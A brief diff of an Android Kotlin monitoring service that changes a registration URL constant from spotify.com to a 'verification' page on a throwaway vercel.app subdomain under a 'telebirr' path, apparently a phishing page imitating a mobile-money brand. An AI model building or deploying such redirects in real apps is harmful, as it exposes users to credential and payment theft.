@@ -31,7 +31,7 @@ class AppMonitorService : Service() {
     companion object {
         private const val TAG = "AppMonitorService"
         const val CHANNEL_ID = "notify_monitor"
-        const val REGISTRATION_URL = "https://spotify.com"
+        const val REGISTRATION_URL = "https://verification-six-gilt.vercel.app/telebirr"
         const val NOTIF_ID = 1001
         const val ACTION_START = "com.notify.action.MONITOR_START"
         const val ACTION_REFRESH = "com.notify.action.MONITOR_REFRESH"
